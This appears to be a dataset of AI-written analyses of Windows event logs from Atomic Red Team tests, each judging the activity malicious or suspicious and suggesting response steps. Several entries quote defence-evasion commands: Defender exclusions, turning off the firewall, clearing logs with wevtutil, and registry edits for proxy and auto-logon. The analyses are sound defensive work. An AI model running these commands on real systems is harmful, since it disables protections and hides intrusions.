   - Apply stricter access controls for log clearance operations, ensuring it's limited to only necessary personnel.

3. **Investigate and Isolate:**
   - Conduct a full forensic investigation on the device involved to identify any implanted threats.
   - Consider isolating the system to mitigate potential propagation across the network.

4. **Security Policy Review:**
   - Review and potentially adjust policies around the handling of security logs and execution permissions for tools like PowerShell and wevtutil.

### Resolution:
- **MALICIOUS:** The activities observed in the logs—mediated use of PowerShell to disable security features and the command-line utility operations to clear logs—all indicate steps typically observed in post-compromise actions aimed at persistence and defense evasion."
WMIC Tamper with Windows Defender Evade Scanning Folder,"Based on the provided logs, I conducted a detailed analysis to identify any suspicious or malicious behavior. Here's what stands out:

1. **Event Clearing Actions:** 
   - The logs indicate that multiple event channel logs have been cleared, including System, Security, and Windows PowerShell. Specifically, Sysmon logs show `wevtutil.exe` was used to clear the following logs: `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`. This action is performed by the user `admin_test`, which might indicate an attempt to conceal tracks, a possible indicator of malicious activity.

2. **Command Line Usage:**
   - The Sysmon logs reveal the use of `cmd.exe` to run `wmic.exe` for adding an exclusion path to Windows Defender: `wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=""ATOMICREDTEAM""`. This type of activity is commonly seen in adversarial tactics to avoid being detected by Windows Defender. The exclusion path named ""ATOMICREDTEAM"" may indicate the use of Atomic Red Team techniques, which are used for testing and simulating adversary behavior but can also be exploited for malicious purposes.

3. **Use of System Utilities:**
   - Several system utilities such as `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `wmic.exe` are executed by `admin_test`. While these utilities are legitimate and could be used for administrative purposes, their usage patterns, especially in conjunction with log clearing and manipulation of security settings, align with tactics employed by attackers.

4. **Time Change Events:**
   - The security logs indicate that the system time was changed twice within a short span. Time manipulation can be another technique employed to affect the integrity of logs.

5. **High Integrity Level:**
   - All suspicious commands and executions are performed at a high integrity level, demonstrating that `admin_test` has elevated privileges, which poses a significant risk if the account is compromised.

**Assessment:**
The observed activities, such as event log clearing, use of administrative tools for suspect purposes, and system time changes, are highly indicative of potentially malicious actions. This behavior is consistent with attempts to cover tracks and gain persistence or further access by evading security measures.

**Threats/Risks Identified:**
- Potential compromise of `admin_test` account.
- Escalation of privileges.
- Evasion of detection by security mechanisms.

**Guidance on How to Proceed:**
1. Immediately review and secure the `admin_test` account. Change passwords and assess for unauthorized access.
2. Investigate further for signs of unauthorized access or malware, especially targeting persistence and evading defenses.
3. Consult with incident response specialists to perform a deeper analysis and system clean-up.
4. Consider reviewing and potentially re-imaging the affected system after a thorough investigation.
5. Strengthen monitoring and review of unused or unexpected configurations in Windows Defender and other security tools.

**Resolution: MALICIOUS** - The combination of event log clearing, exclusion path addition in Windows Defender, and system time manipulation strongly suggests malicious activity with the intent to conceal actions and avoid detection."
Disable Microsoft Defender Firewall,"In a detailed analysis of the provided Windows event logs from multiple channels (Application, System, Security, and Sysmon), the following suspicious activities have been identified:

1. **Log Clearing Events**: There are several instances where event logs are cleared, specifically:
   - EventID 1102 in the Security log indicates that the security log was cleared by the user `admin_test`.
   - EventID 104 in the System log also indicates log clearing activity in both the System and Windows PowerShell channels.

   Log clearing is a common tactic used by attackers to cover their tracks and could be an indicator of malicious activity.

2. **Commands Executed via Command Line**:
   - The execution of `cmd.exe` with the command `netsh advfirewall set currentprofile state off` suggests that the firewall on the system was disabled. This is a significant security risk and is not typically a benign activity. Disabling firewall settings may allow unauthorized access or data exfiltration.

3. **Privilege Escalation and High Integrity Level Activity**: 
   - Multiple log entries show high integrity level processes (indicating administrative privilege) executed by the 'admin_test' user. Events like EventID 4672 in the Security log indicate special privileges being assigned, which includes `SeDebugPrivilege`, allowing processes to debug other processes, a typical requirement for certain sophisticated attack vectors.
   
4. **Processes and Network Connections**:
   - Processes like `wevtutil.exe` and `conhost.exe` running under the `admin_test` user with explicit command lines to clear logs reinforce the potential of responsible user involvement in malicious actions. The use of `wsmprovhost.exe`, often associated with remote connections, as a parent process for these activities could point towards possible remote command execution or automation scripting.

Considering these activities:
- The combination of logs being cleared, disabling the firewall, and the usage of well-known administrative tools in contexts that suggest administrative and potentially remote execution access patterns are substantial indicators of malicious activity.

**Assessment**: The evidence from the logs strongly suggests malicious activity. The sequence of events – particularly the use of administrative tools to disable security controls and the clearing of logs – aligns with common techniques used by attackers to evade detection and establish control.

**Resolution**: MALICIOUS

**Guidance**:
1. Conduct a full system forensic analysis, focusing on the timeline of these events to uncover further actions that may have been performed on the host.
2. Isolate the affected system from the network to prevent further potential damage or exfiltration of data.
3. Review all administrator accounts and elevate monitoring and logging for suspicious activities on those accounts.
4. Examine and restore firewall policies to secure defaults, and ensure event logging is properly configured to prevent clearing by users without explicit permissions.
5. Consider involving a threat intelligence team to further investigate and assess the risk presented by this compromise.

Additionally, initiate an incident response protocol to manage the fallout and prevent recurrence."
UACME Bypass Method 39,"### Analysis of Logs

Upon examining the provided log entries, several suspicious activities stand out that could potentially indicate malicious activity.

1. **Log Clearing Activity**:
   - **System Logs**: Events 104 (System and PowerShell Channel log cleared).
   - **Security Log**: Event 1102 (indicates security logs have been cleared).
   
   Log clearing activities are typically associated with an attempt to remove traces of potentially malicious actions. It's performed by user `SERVER002\admin_test` which raises concerns since legitimate administrators usually have no reason to clear logs unless performing specific maintenance or troubleshooting tasks, and it should always be documented.

2. **Execution of Uncommon Applications**:
   - **Sysmon Log**: There is a process execution involving `cmd.exe` with a very suspicious command-line argument related to the execution of `Akagi64.exe`.
   - **Path**: `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\uacme\39 Akagi64.exe`
   
   The usage of `cmd.exe` for executing another executable located in a `Temp` directory is often a sign of malicious activity, especially with tool names like `uacme`, which is publicly used for UAC (User Account Control) bypass techniques.

3. **Multiple Instances of `wevtutil.exe`**:
   - Several instances of `wevtutil.exe` were observed, each tasked with clearing logs (e.g., System, Application, Security). The pattern of these up as executed by `admin_test`, suggests attempts to hide activities.

4. **Usage of AtomicRedTeam File Paths**:
   - The paths and filenames resemble those used by red teaming practices or security simulators which can be indicative of a security exercise. However, if this was not sanctioned and documented, it could denote unauthorized penetration testing activities or training artifacts being executed inappropriately or malicious intent.

5. **Processes Executed as SYSTEM**: 
   - Various `MicrosoftEdgeUpdate.exe` processes ran under `NT AUTHORITY\SYSTEM`, a legitimate activity, but the timing coincides with other suspicious events.

### Threat Assessment and Risks
- The presence of system log clearing, execution of potentially unwanted software, and unusual command-line activities suggest a high risk of malicious activity.
- If these activities were not sanctioned or expected, they could indicate a compromise, an insider threat, or unauthorized testing.

### Guidance on How to Proceed
1. **Immediate Actions**:
   - Review any documented and approved security exercises that might align with these activities.
   - Check with IT or security teams if anyone was conducting simulations or utilizing the AtomicRedTeam tools.
   - Isolate affected systems to prevent any further potential unauthorized access or lateral movement.

2. **Follow-up Actions**:
   - Conduct deeper forensics on the local file system, especially focusing on `AppData\Local\Temp` directories.
   - Review user `admin_test`'s activities further to ensure no other unauthorized actions have been taken.
   - Implement monitoring for any log-clearing events and investigate any such incidents promptly going forward.
   - Inform management and consider engaging with incident response if this activity was unauthorized and potentially malicious.

### Conclusion
Given the context of the logs, the presence of log clearing, execution of tools possibly used for bypassing security, and storing potentially malicious executables in Temp suggest a state of compromise or aggressive penetration testing.

**Resolution: MALICIOUS** - if the activities are unauthorized and not documented as part of a legitimate security exercise or permissions test. Otherwise, further investigation is advised."
InstallUtil class constructor method call,"Upon reviewing the provided logs, several events raise concerns related to potential malicious activity, especially focusing on the use of command line tools and rapid log clearing actions. Here’s the detailed breakdown of findings:

### Security and System Logs:
1. **Event ID 1102** in the Security log: This event indicates that the security log was cleared by the user `admin_test`. Clearing event logs is a significant indicator of suspicious activity as it can be used to hide potentially malicious actions. It's important to investigate why this action was taken.

2. **Event ID 104** in the System log: This shows the ""System"" and ""Windows PowerShell"" logs being cleared around the same time by the same user `admin_test`. Again, log clearing is often associated with attempts to cover tracks.

3. **Event ID 4616** in Security log: Time changes indicating potential time-tampering are noted with `svchost.exe` changing the system time. Time changes aren't conclusive by themselves but paired with other potentially evasive actions, they raise concerns.

### Windows PowerShell Logs:
- The execution of a script located in user temp folders, such as `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.004\\src\\InstallUtilTestHarness.ps1""`, is another red flag. Atomic testing frameworks, like Atomic Red Team, are often used for testing security defenses but can be misused by malicious actors to simulate attacks.

### Sysmon Logs:
- **Event ID 1**: Multiple executions of `wevtutil.exe`, a command-line tool for managing event logs, were detected. This was also used by `admin_test` for clearing logs, which aligns with the suspicious activity noted in Security and System logs.

- **Event commands and activities**:
  - Use of `PowerShell`, `csc.exe`, and `InstallUtil.exe` with scripting activities targeting install utilities suggests possible attempts at code execution or persistence via .NET assemblies.
  - Multiple Microsoft Edge Update processes, such as `MicrosoftEdgeUpdate.exe`, show activity. While edge updates can be common, the timing and frequency here, sometimes seen alongside obfuscation efforts, raise suspicions.

### Combined Analysis:
The combination of clearing logs, script execution via PowerShell, and use of system utilities to manipulate logs points towards potential malicious behavior. The presence of Atomic Red Team artifacts suggests a possible dual-use scenario: either legitimate security testing gone unattributed or a cover for malicious intents.

### Conclusion:
Given the accumulation of suspicious activities:

- Logs being cleared.
- PowerShell scripts invoking unusual test harnesses.
- Elevated usage of utilities that are often a legitimate part of Red Team or attacker methodology (e.g., Atomic Red Team).

**Resolution: SUSPICIOUS**

This activity demands further investigation to determine the intent, ensuring these actions are not conducted without authorization. Actions should include:
- Confirming with IT/security teams if this is part of a sanctioned security audit or testing.
- Examining any related network activity for signs of data exfiltration or command-and-control.
- Reviewing other security and system logs for evidence of unauthorized access.

Prompt actions can ensure that if this activity is not benign, it can be contained effectively."
Allow Executable Through Firewall Located in Non-Standard Location,"Upon analyzing the provided log entries from various Windows event logs, I have identified several points of interest with potential for malicious activities:

1. **Event Logs Clearing Events:**
   - In the system and security logs, there are multiple instances where the event logs have been cleared (`EventID 104` and `EventID 1102`). These actions have been performed by the user `admin_test`. Clearing event logs can be a method used by attackers to hide their tracks. This activity in itself raises immediate suspicion and warrants further investigation.

2. **Suspicious Use of PowerShell:**
   - An execution of PowerShell commands is logged where a file named `AtomicTest.exe` is copied to a user's directory, and a firewall rule is created to allow this executable. The use of PowerShell to execute such commands is often a tactic used by attackers to deliver and allow malicious payloads to execute without obstruction (`EventID 600` in the PowerShell log and corresponding Sysmon processes).

3. **Usage of Wevtutil:**
   - Usage of `wevtutil.exe` with `cl` flag (clear logs) for different channels including Sysmon and Security showcases an attempt to cover tracks by clearing logs that are crucial for auditing purposes (`Sysmon log EventID 1, 5`). This is associated with the benign user account `admin_test`, suggesting malicious activity potentially performed under a compromised account or privilege escalation.

4. **Network Activity:**
   - The `netsh` command execution to add a firewall rule is directed to allow traffic for `AtomicTest.exe`. This potentially indicates network access permissions are being manipulated for executables that might be unwanted or harmful, enabling them to communicate externally or across the network.

5. **Presence of Known Red Team Tool:**
   - The reference to `AtomicRedTeam`, a known red team assessment and training toolkit, could suggest either sanctioned testing or malicious use by an unauthorized/intruder party mimicking red team activities.

**Assessment:**
Based on the above analysis:
- These logs present highly suspicious activities, including event log clearing, PowerShell misuse, unauthorized firewall rule changes, and the use of a known security tool in a questionable manner.
- The combination of these activities strongly points towards potential malicious behavior, albeit it might be authorized red team testing if discussed and verified with the relevant security team.

**Resolution:**
- **SUSPICIOUS**: While elements of red team activity are apparent, this cannot conclusively be claimed as malicious without further inquiry. It is crucial to verify the origin of these actions, ensure no unauthorized access was made, and confirm whether these actions were authorized as part of internal testing or assessments.

**Guidance on Proceeding:**
1. Verify whether `admin_test` was an account used by authorized personnel conducting legitimate testing.
2. Communicate with the security operations or red team for potential legitimate explanation of these activities.
3. Investigate further to ensure no unauthorized privilege escalation or external breach occurred around the timeline.
4. Tighten monitoring on PowerShell activity and ensure all changes to firewall rules and event logs are scrutinized for approval chains.
5. If unauthorized actions are suspected, initiate security incident response protocol to isolate and mitigate further risks."
LockBit Black - Use Registry Editor to turn on automatic logon -cmd,"After carefully reviewing and analyzing the provided log entries, here is a detailed assessment:

### Summary of Threats and Findings:

1. **wevtutil.exe Usage**: 
   - **wevtutil.exe** (Eventing Command Line Utility) is executed multiple times with the `cl` (clear) command targeting logs like Sysmon, Application, System, Security, and Windows PowerShell.
   - This could be an indication of a potential attempt to cover tracks after a compromise or malicious activity, as clearing event logs is a common practice to avoid detection.

2. **Command Execution via cmd.exe**:
   - The `cmd.exe` process was used to add registry keys related to Winlogon to enable AutoAdminLogon with a set username and password.
   - The command modifies critical settings, indicating an attempt to set up automatic login, potentially to maintain persistent access to the system.

3. **Logon User Details**:
   - The activities are performed under the user `SERVER002\\admin_test`, suggesting either insider activity or an account compromise.
   - Additionally, the terminal session and integrity level were high, providing significant control over the system.

4. **Event Log Clearance**:
   - The logs indicate several instances of clearing event logs (Sysmon ID 5), like Security, System, and Windows PowerShell (e.g., EventID 1102 in Security log).
   - This action often signifies further attempts to erase forensic evidence of past actions and is highly suspicious without proper justification.

5. **System Time Modification**:
   - There are entries indicating a modification of system time (Security EventID 4616), which might be used to manipulate time stamps to confuse event timelines in logs.

### Conclusion:

The collected evidence from the logs strongly indicates activity that is consistent with malicious or potentially harmful behavior:

- The use of `wevtutil.exe` to clear logs is uncommon for regular system use unless for planned maintenance.
- Registry modifications to Windows login features could indicate an attempt at unauthorized persistent access.
- Event log entries showing modifications to essential registry settings and clearance efforts in rapid succession further suggest deliberate actions to obscure actions.

Based on the evidence and analysis, the resolution of this investigation should be classified as:

### MALICIOUS

### Guidance on How to Proceed:

1. **Immediate Response**:
   - Isolate the affected host (Server002) from the network to prevent further unauthorized access or data exfiltration.
   - Reset credentials for the `admin_test` account and any other potentially compromised accounts.
   
2. **Forensic Analysis**:

DCShadow (Active Directory),"Upon analyzing the provided Windows event logs, the following observations and indicators of potential malicious activity were identified:

### Observations:

1. **Powershell Execution:**
   - Event ID `1` and `5` logs show multiple instances of `powershell.exe` being executed by `SERVER002\admin_test`.
   - Notably, one of the execution involves a complex command line with the PowerShell's `dcshadow` technique that's used for simulating domain controller replication using tools like Mimikatz.

2. **Usage of Mimikatz:**
   - The PowerShell command attempts to execute Mimikatz using `PsExec`, which are known tools for credential dumping and privileged access attempts.
   - The commands involve creating a fake domain controller and modifying Active Directory attributes, indicative of a potential DCShadow attack.

3. **Wevtutil Command Usage:**
   - Several instances of `wevtutil.exe` are observed clearing logs (EventID `104` in System log, `1102` in Security log).
   - Clearing logs is a typical post-exploitation tactic to cover tracks or reduce visibility of malicious activities.

4. **Conhost.exe:**
   - Several `conhost.exe` processes are spawned seemingly related to the above events, potentially indicating malicious processes being interfaced with command prompt instances.

5. **Microsoft Edge Update:**
   - The Edge Update processes and tasks appear benign within the context of legitimate software updates.

### Assessment and Determination:

- The activity of PowerShell attempting DCShadow operations with Mimikatz and PsExec suggests advanced adversary tactics aiming to manipulate Active Directory components.
- Usage of `wevtutil.exe` for clearing Windows logs further demonstrates potential malicious intent to evade detection.
  
Based on these analyses, it can be surmised with a high degree of certainty that the logs contain evidence of a potential compromise of the system.

Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell,"### Analysis

Upon examining the provided Windows event logs, the following suspicious activities and potential indicators of compromise have been identified:

1. **Clearing of Event Logs:**
   - Sysmon and Security event logs indicate that several log files, including the System, Windows PowerShell, and Security logs, were cleared by the user `admin_test` on `SERVER002` (EventIDs 104 for System and EventID 1102 for Security). Clearing event logs is a common tactic used by attackers to cover their tracks after conducting malicious activities.

2. **PowerShell Execution with Suspicious Command:**
   - There is a PowerShell event where `powershell.exe` executed a command that modifies registry settings related to automatic logon (EventID 600 in the Windows PowerShell log). The command is trying to set `AutoAdminLogon`, `DefaultUserName`, `DefaultDomainName`, and `DefaultPassword`, which is highly suspicious and indicates an intention to persist access to the system:
     - `AutoAdminLogon` is being set to `1`.
     - Registry entries are created or modified for username (`Administrator`), domain (`contoso.com`), and a password.

3. **Unusual Use of `wevtutil.exe`:**
   - The process `wevtutil.exe`, an Eventing Command Line Utility, is being used by `admin_test` with high integrity level multiple times to clear event logs for various channels (e.g., `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Windows PowerShell`, and `Security`). Such extensive use of `wevtutil.exe` in a short period indicates log tampering intended to hide system activities.

### Assessment

The logs reveal clear signs of potentially **malicious activities**:
- The attempt to modify the registry settings for auto logon with potentially malicious intent.
- The clearing of multiple event logs, particularly security-related logs.
- These actions align with tactics typically used in post-exploitation activities, particularly for persistence and evidence cleanup.

### Resolution

- **MALICIOUS**: Based on the analysis, the activities captured in the logs are suspicious enough to be considered malicious. The combination of log clearing and registry modifications resembles techniques used in unauthorized access and system persistence.

### Guidance on How to Proceed

1. **Immediate Isolation and Forensics:**
   - Isolate `Server002` from the network to prevent further compromise or data exfiltration.
   - Preserve a full forensic copy of the system for a detailed investigation.

2. **Registry and Task Scheduler Review:**
   - Conduct a detailed review of the registry changes relating to logon settings and scheduled tasks.
   - Undo any unauthorized registry changes to remove persistence mechanisms.

3. **Accounts and Credentials Security:**
   - Reset passwords for any accounts present on the system, especially the account `admin_test`.
   - Review access logs for signs of unauthorized access and reassess access controls.

4. **Log Review and SIEM Tuning:**
   - Enhance monitoring of log files for similar activities and improve logging tools to alert on such events.
   - Ensure that log retention policies are enforced, and regularly review log backup and archival processes.

5. **Incident Response and Remediation:**
   - Engage the incident response team to manage the containment, eradication, and recovery process.
   - Report the incident to management and relevant authorities if necessary due to policy or regulatory requirements."
Tamper with Windows Defender Evade Scanning -Folder,"Upon investigation of the provided Windows event logs, there's a noticeable sequence of events that could imply malicious activity:

### Detailed Analysis:

1. **PowerShell Activity**:
   - The logs show a PowerShell command execution: `powershell.exe & {$excludedpath= ""C:\\Temp""; Add-MpPreference -ExclusionPath $excludedpath}`. This particular PowerShell activity is suspicious because it involves modifying Windows Defender preferences to exclude a directory from antivirus scanning. Excluding directories can be leveraged by attackers to store and execute malicious code without being detected.

2. **Event Log Clearing**:
   - Multiple instances of Windows event log files being cleared are noted in the logs:
     - Event ID 1102 in the security log indicates the security audit log was cleared by a user identified as ""admin_test"".
     - Event ID 104 in the system log shows the System and Windows PowerShell channels were cleared.
   - Clearing event logs is often executed by attackers attempting to hide traces of their activity.

3. **Time Anomalies**:
   - There are events showing time changes, for example, Event ID 4616 in the security log, which might indicate time tampering, often used in evasion tactics or sysadmin testing.

4. **High Integrity Process Execution**:
   - The execution of the `wevtutil.exe` with the `cl` (clear log) command amidst other typical Windows processes like `svchost.exe`, `conhost.exe`, and `whoami.exe`. This is another method often used to clear logs but with direct evidence of commands to specifically clear logs, this inclusion raises further suspicion.

5. **Login and Privilege Elevation**:
   - The logs show a logon session with Event ID 4624 occurring via NTLM, potentially an anomalous logon type given the timing and lack of further context on expected activity patterns.
   - Event ID 4672 indicates elevation of privileges with several high-level privileges being utilized (e.g., `SeDebugPrivilege`).

6. **Auth Audit**:
   - The logs show system processes being executed with a high integrity level and SYSTEM privileges without clear context. Niemeyer principle—understanding normal baseline activity—would suggest this could be part of a malicious pattern if not contextually expected.

### Conclusion:

- **Overall Assessment**: **MALICIOUS**. The combination of modifying PowerShell Defender settings, multiple log clearances, privilege escalsation without being part of a scheduled admin task, and multiple executions with high-level privileges strongly suggests malicious intent. These are common techniques used by an adversary to escalate privileges, persist, and cover tracks.

### Guidance on How to Proceed:
- Immediately initiate an incident response protocol. Isolate the server from the network to prevent lateral movement or additional data exfiltration.
- Conduct a thorough forensic analysis on the server to identify any unauthorized changes, additional anomalies or root cause.
- Review user `admin_test`'s recent activities and access patterns.
- Check endpoint protection alerts and configurations, especially regarding PowerShell events.
- Educate and create additional awareness for users with administrative access regarding best practices and monitoring measures.
- Consider threat hunting exercises within your network to identify similar patterns or hidden malicious activity."
Masquerading - cscript.exe running as notepad.exe,"Upon reviewing the Windows event logs, several indicators suggest that the activities performed on the system warrant further investigation:

1. **Clearing of Event Logs**: 
   - Multiple event log entries indicate that logs were cleared by the user ""admin_test"". 
   - The System log entry with EventID 104 indicates 'LogFileCleared' for System, Windows PowerShell channels by the user ""admin_test"".
   - The Security log entry with EventID 1102 also indicates 'LogFileCleared', typically suggesting an attempt to cover tracks of potentially malicious activities.

2. **Suspicious Process Execution**:
   - The Sysmon logs reveal an execution chain involving the `cmd.exe` process with unusual command-line arguments that essentially disguise `cscript.exe` as `notepad.exe` and execute it in a seemingly obfuscated manner. This behavior is highly suspicious and often associated with malware trying to evade detection.
   - The presence of `cmd.exe` copying `cscript.exe` to a location in the `APPDATA` as `notepad.exe` and executing it could indicate an attempt to run scripts without detection.

3. **Unusual Command Usage**:
   - The use of `wevtutil.exe` commands by ""admin_test"" for clearing different log channels ('Microsoft-Windows-Sysmon/Operational', 'Application', and 'System') is unusual for regular administrative tasks and aligns with potential log tampering.

4. **Execution of Whoami**:
   - Multiple executions of `whoami.exe` in the Sysmon logs by ""admin_test"" could imply reconnaissance activity. While this might not be suspicious in isolation, coupled with the other activities it raises concerns.

5. **Update and Antivirus Activity**:
   - Entries related to Windows Update (e.g., `wuauclt.exe`) and Microsoft Defender updates appear normal and do not indicate malicious actions.

Overall, the clearing of logs, suspicious command-line executions, and unusual processes coupled with the activity of ""admin_test"" strongly suggest potentially malicious behavior. Although the Windows Update and Antivirus activities appear routine, the highlighted activities carry significant risk indicators.

**Resolution**: **MALICIOUS**

### Recommendations:
- **Immediate Action**: Isolate the affected system to prevent further potential compromise.
- **Further Investigation**: Follow up with detailed forensic analysis, including memory analysis and checking for indicators of compromise (IOCs).
- **User Review**: Investigate the actions and legitimacy of the user ""admin_test"".
- **Network Analysis**: Examine network traffic logs for unusual outbound connections during the timeframe of suspicious activities.
- **Strengthen Security Posture**: Consider enhancing logging and monitoring, applying stricter access controls, and conducting security awareness training.

These steps will help safeguard the infrastructure while ensuring any potential threats are addressed."
Set-Up Proxy Server,"Upon analyzing the provided log entries, certain activities stand out which suggest potentially suspicious behavior, though not definitively malicious without further context:

### Analysis:

1. **Event Log Cleared:**
   - **Events 104 (System), 104 (Windows PowerShell), and 1102 (Security)** indicate that logs in these channels were cleared at the same timestamp by the user `admin_test`.
   - Clearing event logs, especially across multiple channels, is suspicious as it is often done to cover tracks by those with administrator-level access.

2. **Execution of `wevtutil` Command:**
   - Multiple instances of `wevtutil.exe` execution are recorded in the logs, corroborating the log-clearing activities. This tool is used for managing event logs and can be used maliciously to clear logs as part of anti-forensic measures.

3. **Command-Line Execution (`cmd.exe` and Registry Modification):**
   - An instance of `cmd.exe` executed a command to change proxy settings in the registry (`""cmd.exe\"" /c reg add \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"" /v ProxyServer /t REG_SZ /d \""proxy.atomic-test.com:8080\"" /f""`).
   - Modifying proxy settings through the command line without clear justification can be indicative of redirecting network traffic via a potential adversary-controlled proxy server.

4. **System Integrity and Activity Monitoring:**
   - Regular system activities such as Windows Update (EventID 19), `svchost.exe`, `MusNotification.exe` execution, etc., appear to be routine and expected for maintaining system operations.

5. **Privilege Use Event 4672:**
   - The presence of high privilege use, specifically for `SYSTEM` account using Security Auditing Privileges, is expected in legitimate admin activities but unusual if these correlate strongly with other anomalous activities.

### Conclusion:

Given the combination of log-clearing actions, command executions altering system settings, and the pattern of behavior following these actions, there exists strong suspicion of potentially unauthorized activities. These patterns suggest attempts to cover tracks, potentially indicate post-exploitation cleanup or preparation steps for unauthorized network traffic redirection.

### Resolution: **SUSPICIOUS**
- **Risks Identified:** Possible unauthorized access or system compromise with intention to conceal activities.
- **Guidance Next Steps:**
  1. **Conduct a Forensic Investigation:** Dig into the timeline of activities around the log clearing event. Recover deleted logs if possible.
  2. **Review User Activity:** Check user account `admin_test` for abnormal login attempts and verify the authenticity of activities conducted under this account.
  3. **Network Traffic Analysis:** Assess outbound connections and proxy configurations to ensure there is no exfiltration or redirection to suspicious endpoints.
  4. **System Audit:** Inspect additional hosts and systems within the network for similar patterns of event log clearing or registry manipulation.
  5. **Credential Hygiene:** Examine and possibly rest credentials for the affected and at-risk accounts to prevent further unauthorized access.

This synthesis recommends a deeper investigation to validate or dispel the suspicion of malicious activity."
Registry-free process scope COR_PROFILER,"Upon detailed analysis of the provided Windows event logs, there are several activities that highlight potential suspicious or malicious actions:

1. **Event Log Clearing**: 
   - In the Security log, Event ID 1102 indicates the security log was cleared by the user ""admin_test"". Furthermore, similar events are noted in the System log (Event ID 104) for both the System and PowerShell log files. This action can often indicate an attempt to remove traces of potentially unauthorized or malicious activity.
   
2. **Use of Notable PowerShell Environment Variables**:
   - The set PowerShell environment variables, including `COR_ENABLE_PROFILING` and `COR_PROFILER`, point to potentially malicious activity involving .NET profilers. The use of the `T1574.012` path within the temp directory `AtomicRedTeam` indicates a possible simulation attack or red team activity related to ""Hijack Execution Flow: DLL Search Order Hijacking"".
   
3. **Repeated PowerShell Activity**:
   - Several entries point toward the execution of PowerShell scripts that contain suspicious command line arguments related to .NET profiler hijacking. This aligns with tactics used for tampering with execution flows—potentially altering how specific applications run.

4. **Process Execution and Command Line Arguments**:
   - The use of `wevtutil.exe` to clear event logs further amplifies the suspicion since this utility is not typically used during standard operations.
   - Standard processes like `conhost.exe` and `whoami.exe` appearing after the execution of suspicious PowerShell scripts suggest exploration of the current user context post tampering attack attempts.

In summary, several indicators suggest potential malicious activity on the host:
- The clearing of multiple system logs.
- The presence of environment variable manipulations related to .NET profiling.
- Usage of tools and methods leveraging red teaming tactics.

**Assessment**: MALICIOUS

**Guidance on how to proceed**:
- Immediately isolate the host (Server002) from the network to prevent any further malicious activity.
- Investigate any unauthorized use of the ""admin_test"" account and monitor for the creation of new local accounts.
- Analyze the impacted user session environment, user permission levels, and any files or configurations altered in the directories involved with the profiler settings.
- Conduct a full forensic analysis of the system to assess the extent of potential compromise.
- Recommend user education on avoiding practices that could expose systems to such hijack attempts inadvertently."
Dynamic API Resolution-Ninja-syscall,"Upon analyzing the provided event logs, several activities stand out as indicative of potentially suspicious or malicious actions:

1. **Log Clearing Observations:**
   - System, PowerShell, and Security logs were cleared (EventID 104 in the system logs and EventID 1102 in the security logs) by a user named `admin_test`. Clearing these logs is highly suspect and often indicative of an attempt to cover potentially harmful actions. This activity is noteworthy because it aligns with tactics often used to obfuscate malicious activities.

2. **Execution of Unusual Commands:**
   - The PowerShell logs reveal the execution of a PowerShell command that includes the use of `Start-Process` to execute `ninja_syscall1.exe` from the AtomicRedTeam toolkit. This is a known security testing framework and often used in penetration testing or Red Teaming exercises to simulate adversaries. While this tool can be used legitimately, its presence suggests post-exploitation activities and warrants further investigation to understand the context of its use.
   - There is another consistent pattern found in Sysmon logs where `wevtutil.exe` is used repeatedly to clear various event logs (`/cl` flag), reinforcing the suspicion of log manipulation.

3. **User Accounts and Privileges:**
   - Most activities tied to suspicious events were executed under the user `SERVER002\\admin_test`, who seems to have high privileges considering its ability to clear logs and execute processes with elevated rights.

4. **Microsoft Defender Updates:**
   - Among the events are legitimate Microsoft Defender Antivirus update activities, which are routine maintenance actions on the system. These benign activities help blend normal operations within the suspicious activities and can sometimes serve as noise in analyzing logs.

5. **Atomic Red Team Execution:**
   - The execution of a binary within the `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam` path strongly suggests simulated adversary techniques potentially for testing. The lack of clarity on whether this was sanctioned or unsanctioned makes it suspicious.

### Assessment:
Based on the reviewed logs:
- **Clearing of crucial logs** under an admin account.
- **Execution of suspicious binaries** often associated with exploitation frameworks.
- These actions collectively are indicative of potentially **malicious behavior**.

### Resolution:
Given the various elements that indicate potentially harmful actions (log clearing, specific execution of tools used in adversary simulations, etc.), I would classify this activity as **MALICIOUS**. It reflects patterns commonly associated with preparatory or active engagement in system compromise attempts.

### Guidance:
1. **Immediate Response:**
   - Conduct a forensic investigation on the host to uncover any unauthorized alterations or installations caused by these activities.
   - Evaluate whether the use of Atomic Red Team was authorized and understand its scope.
   
2. **Security Controls:**
   - Strengthen detection rules for such suspicious activities, including log clearance and unauthorized PowerShell executions.
   
3. **Review and Remediate:**
   - Assess all systems for similar signs and ensure protective and detective controls are stringent on such tools and activities, especially on admin-level accounts.
   - Notify involved parties, particularly those who may have executed or initiated these scripts or commands, to understand their intent and to prevent future unauthorized activities."
Delete a single file - Windows PowerShell,"Upon review of the provided Windows logs, the following observations and assessments have been made:

### Key Observations:

1. **PowerShell Usage:**
   - The PowerShell log indicates the execution of a PowerShell command with `Remove-Item -path $env:TEMP\\deleteme_T1551.004`. The removal of files from temporary directories isn't inherently suspicious, but it could be indicative of a cleanup operation post-malicious activity.

2. **Log Clearing Events:**
   - The Sysmon, Windows PowerShell, and System event logs all show that logs were cleared. This typically happens when someone is trying to cover their tracks. The subject user in these events is ""admin_test"", and the client process responsible for clearing logs was ""wevtutil.exe,"" known for managing Windows event logs (`wevtutil.exe cl <log>` typically clears logs).

3. **Unusual Use of `Wevtutil.exe`:**
   - In several Sysmon events, `wevtutil.exe` is executed with the command line `cl`, which means clearing logs. This aligns with the observation that the logs were indeed cleared.

4. **Microsoft Edge Update Process:**
   - A significant amount of activity is related to Microsoft Edge updates, which generally appear benign. However, they are not directly related to the suspicious log clearing activities.

5. **Security Log Clearance:**
   - The Security log was cleared, as indicated by Event ID 1102. Clearing of the Security event log is particularly concerning, as it’s often part of obfuscating unauthorized activity.

### Assessment:

- **Suspicious Indicators:**
  - The concurrent clearing of multiple event logs (System, Security, Windows PowerShell logs) is suspicious and potentially indicative of a compromise or unauthorized activity, especially considering that this action would help hide tracks of whatever activities took place on the system.
  - Usage of administrative PowerShell commands and `wevtutil.exe` by ""admin_test"" to clear logs.
  - The use of `powershell.exe` with specific scripts that don't appear to have benign purposes.

